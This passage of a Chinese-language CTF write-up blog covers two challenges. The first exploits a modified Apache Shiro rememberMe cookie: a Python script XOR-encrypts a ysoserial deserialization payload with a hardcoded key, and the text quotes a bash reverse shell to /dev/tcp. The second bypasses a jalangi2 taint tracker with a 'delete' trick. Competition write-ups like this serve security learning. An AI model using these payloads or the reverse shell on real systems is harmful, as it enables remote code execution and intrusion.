</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> <span style=color:#ff79c6>(</span><span style=color:#8be9fd>int</span> i <span style=color:#ff79c6>=</span> 0<span style=color:#ff79c6>;</span> i <span style=color:#ff79c6>&lt;</span> out<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>;</span> i<span style=color:#ff79c6>++)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>      result<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span><span style=color:#8be9fd>byte</span><span style=color:#ff79c6>)(</span>out<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>^</span> okey<span style=color:#ff79c6>[</span>i <span style=color:#ff79c6>%</span> okey<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>]);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> ByteSource<span style=color:#ff79c6>.</span><span style=color:#50fa7b>Util</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>bytes</span><span style=color:#ff79c6>(</span>result<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>这相当于魔改了原版的 shiro, 原版的是直接用的 AES. 我们可以看到这里魔改后秘钥是读的 <code>com/collection/shiro/manager/remember.key</code>. (docker 初始自带一个 key, 所有人都用的一个, 不会自己生成).<br>然后算法也从 AES 变成了出题人手写的加密算法. 然后将序列化后的对象 base64 之后放在了 json 的 <code>serialize_data</code> 里面<br>我们可以写个脚本二次重写一下 ysoserial 生成的 payload</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>from</span> hashlib <span style=color:#ff79c6>import</span> md5
</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> hashlib <span style=color:#ff79c6>import</span> sha1
</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> base64 <span style=color:#ff79c6>import</span> b64encode
</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> json <span style=color:#ff79c6>import</span> dumps
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;/home/rmb122/repos/ysoserial/target/1.bin&#39;</span>
</span></span><span style=display:flex><span>payload <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>open</span>(payload, <span style=color:#f1fa8c>&#39;rb&#39;</span>)<span style=color:#ff79c6>.</span>read()
</span></span><span style=display:flex><span>payload <span style=color:#ff79c6>=</span> b64encode(payload)<span style=color:#ff79c6>.</span>decode()
</span></span><span style=display:flex><span>data <span style=color:#ff79c6>=</span> {<span style=color:#f1fa8c>&#34;user_is_login&#34;</span>: <span style=color:#f1fa8c>&#34;1&#34;</span>, <span style=color:#f1fa8c>&#34;sign&#34;</span>: <span style=color:#f1fa8c>&#34;9368b2d39093ed7164841e4050f9cdbeasfda-92u134-&#34;</span>, <span style=color:#f1fa8c>&#34;ip_address&#34;</span>: <span style=color:#f1fa8c>&#34;10.10.19.245&#34;</span>, <span style=color:#f1fa8c>&#34;user_agent&#34;</span>: <span style=color:#f1fa8c>&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#f1fa8c>&#34;serialize_data&#34;</span>: payload}
</span></span><span style=display:flex><span>data <span style=color:#ff79c6>=</span> dumps(data)<span style=color:#ff79c6>.</span>encode()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;wR&amp;_(NVG#c&amp;9(CDhaDMZELDmxSe(mwbB&#34;</span>
</span></span><span style=display:flex><span>k <span style=color:#ff79c6>=</span> md5(key<span style=color:#ff79c6>.</span>encode())<span style=color:#ff79c6>.</span>hexdigest()
</span></span><span style=display:flex><span>k <span style=color:#ff79c6>=</span> sha1(k<span style=color:#ff79c6>.</span>encode())<span style=color:#ff79c6>.</span>hexdigest()<span style=color:#ff79c6>.</span>encode()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>newdata <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>()
</span></span><span style=display:flex><span>newdata_2 <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> data:
</span></span><span style=display:flex><span>    newdata<span style=color:#ff79c6>.</span>append(i)
</span></span><span style=display:flex><span>    newdata<span style=color:#ff79c6>.</span>append(<span style=color:#bd93f9>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#8be9fd;font-style:italic>len</span>(newdata)):
</span></span><span style=display:flex><span>    newdata_2<span style=color:#ff79c6>.</span>append(newdata[i] <span style=color:#ff79c6>^</span> k[i <span style=color:#ff79c6>%</span> <span style=color:#8be9fd;font-style:italic>len</span>(k)])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>print</span>(b64encode(newdata_2))
</span></span></code></pre></div><p>然后直接改到 rememberMe 的 Cookie 上就行了, 尝试了几个 payload 因为 Cookie 是有长度限制的, 平常是直接将序列化数据 base64 贴上去所以不会超出限制. 这里双重 base64 加上加密还得带一个 xor key 导致很多 payload 就不能直接用了. 所以我们这里还是用 JRMPClient 来中转一下, 在自己的机器上跑一个 ysoserial.exploit.JRMPListener 就 ok 了.</p><p>这里需要注意原版的 ysoserial 是直接用的 <code>java.Runtime.getRuntime().exec(payload)</code>, 相当于 <code>execv(payload.split(' '))</code>, 会导致 <code>bash -c "bash -i >& /dev/tcp/10.0.19.3/7777 0>&1"</code> 之类的不能用, 这里当时是用了别的命令利用的漏洞. 赛后 fork 了 <a href=https://github.com/rmb122/ysoserial>ysoserial</a> 改了下, 用的 <code>java.Runtime.getRuntime().exec(new String[]{})</code> 就能直接弹 shell 之类的.</p><h2 id=xctf-final-babytaint-writeup>XCTF Final babytaint Writeup</h2><p>拿到手先 Google <code>jalangi2</code> 是个啥, 可以搜到是个可以 hook javascript 各种操作的库. 这里是拿来搞了污点分析.
如果之前了解过一些编译原理和 PHP 的 taint 拓展, 那这道题确实挺简单的. 本质就是从 /dev/urandom/ 里面获取随机字节作为 secret, 题目 hook 了 &ldquo;Source&rdquo;() 的调用, 返回了 taint 过的 secret, 你需要通过某种方法 bypass 掉这个 taint. 也就是将污点去除.<br>我们看一下源码, 关键就是这个</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>function</span> AnnotatedValue(val, shadow)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>this</span>.val <span style=color:#ff79c6>=</span> val;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>this</span>.shadow <span style=color:#ff79c6>=</span> shadow;
</span></span><span style=display:flex><span>	}
</span></span></code></pre></div><p>这个就是一个包装类, 用 shadow 来记录是否是 taint 过的值. 题目 hook 住了所有计算, 拿二元计算来看</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#ff79c6>this</span>.binary <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>function</span>(iid, op, left, right, result)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>const</span> aleft <span style=color:#ff79c6>=</span> actual(left);
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>const</span> aright <span style=color:#ff79c6>=</span> actual(right);
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>switch</span> (op)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;+&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>+</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;-&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>-</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;*&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>*</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;/&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>/</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;%&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>%</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;&lt;&lt;&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>&lt;&lt;</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;&gt;&gt;&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>&gt;&gt;</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;&gt;&gt;&gt;&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>&gt;&gt;&gt;</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;&lt;&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>&lt;</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;&gt;&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>&gt;</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;&lt;=&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>&lt;=</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;&gt;=&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>&gt;=</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;==&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>==</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;!=&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>!=</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;===&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>===</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;!==&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>!==</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;&amp;&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>&amp;</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;|&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>|</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;^&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>^</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;delete&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>delete</span> aleft[aright];
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;instanceof&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>instanceof</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;in&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			result <span style=color:#ff79c6>=</span> aleft <span style=color:#ff79c6>in</span> aright;
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>default</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>			errExit(op <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34; at &#34;</span> <span style=color:#ff79c6>+</span> iid <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34; not found&#34;</span>);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>		<span style=color:#ff79c6>return</span> {result<span style=color:#ff79c6>:</span> <span style=color:#ff79c6>new</span> AnnotatedValue(result,
</span></span><span style=display:flex><span>			shadow(left) <span style=color:#ff79c6>||</span> shadow(right))};
</span></span><span style=display:flex><span>	};
</span></span></code></pre></div><p>只要两个运算符有一个是 taint 过的, 返回的也是 taint 过的值. 同时我们想要拿到 flag, 需要调用 &ldquo;Sink&rdquo;(secret), 但是输入的 secret</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> (f <span style=color:#ff79c6>===</span> <span style=color:#f1fa8c>&#34;Sink&#34;</span>)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>if</span> (shadow(args[<span style=color:#bd93f9>0</span>]))
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				errExit(<span style=color:#f1fa8c>&#34;Value passed into sink cannot be tained&#34;</span>);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>const</span> arr <span style=color:#ff79c6>=</span> actual(args[<span style=color:#bd93f9>0</span>])
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>!</span>(arr <span style=color:#ff79c6>instanceof</span> <span style=color:#8be9fd;font-style:italic>Array</span>) <span style=color:#ff79c6>||</span> arr.length <span style=color:#ff79c6>!==</span> <span style=color:#bd93f9>0x10</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				errExit(<span style=color:#f1fa8c>&#34;must use an array with length 16 as the key&#34;</span>);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#ff79c6>for</span> (<span style=color:#8be9fd;font-style:italic>let</span> i <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>; i <span style=color:#ff79c6>&lt;</span> arr.length; i<span style=color:#ff79c6>++</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#ff79c6>if</span> (shadow(arr[i])) <span style=color:#6272a4>// check here
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>				{
</span></span><span style=display:flex><span>					errExit(<span style=color:#f1fa8c>&#34;Value passed into sink cannot be tained&#34;</span>);
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#ff79c6>if</span> (actual(arr[i]) <span style=color:#ff79c6>!==</span> secret[i])
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					errExit(<span style=color:#f1fa8c>&#34;Wrong key!&#34;</span>)
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			console.log(<span style=color:#8be9fd;font-style:italic>String</span>(fs.readFileSync(<span style=color:#f1fa8c>&#34;flag&#34;</span>)));
</span></span><span style=display:flex><span>		}
</span></span></code></pre></div><p>也不能是被 train 过的, 这就需要一点技巧来 bypass, 这里我用的是 delete 这个操作符, 因为 delete 影响的是左值对象的本身. 而这里 hook 的时候并不会将左值给 taint 掉, 只会将返回值 undefined 给 taint.
我们可以搞一个大小 256 的数组, 将 secret 作为删除的 key, 然后遍历找到是哪个 key 被 delete 掉, 我们就能获得 secret 的值而不被 taint.<br>最后 payload 如下:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span>key<span style=color:#ff79c6>=</span>[];a<span style=color:#ff79c6>=</span>[]; <span style=color:#ff79c6>for</span> (z<span style=color:#ff79c6>=</span><span style=color:#bd93f9>0</span>;z<span style=color:#ff79c6>&lt;</span><span style=color:#bd93f9>16</span>;z<span style=color:#ff79c6>++</span>){<span style=color:#ff79c6>for</span> (i <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>;i<span style=color:#ff79c6>&lt;</span><span style=color:#bd93f9>256</span>;i<span style=color:#ff79c6>++</span>) {a[i]<span style=color:#ff79c6>=</span><span style=color:#bd93f9>0</span>;};t<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;Source&#34;</span>();<span style=color:#ff79c6>delete</span> a[t[z]];<span style=color:#ff79c6>for</span>(i<span style=color:#ff79c6>=</span><span style=color:#bd93f9>0</span>;i<span style=color:#ff79c6>&lt;</span><span style=color:#bd93f9>256</span>;i<span style=color:#ff79c6>++</span>){<span style=color:#ff79c6>if</span> (a[i] <span style=color:#ff79c6>===</span> <span style=color:#ff79c6>undefined</span>){key[z]<span style=color:#ff79c6>=</span>i;}}};<span style=color:#f1fa8c>&#34;Sink&#34;</span>(key);
</span></span></code></pre></div><p>可以看到不是很复杂, 这道题好像也有很多队伍做出来 233</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/web>web</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div class=footer-info>2022 @rmb122</div><div style=display:flex><a class=border></a><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a></div></footer><script>feather.replace()</script></div></body></html>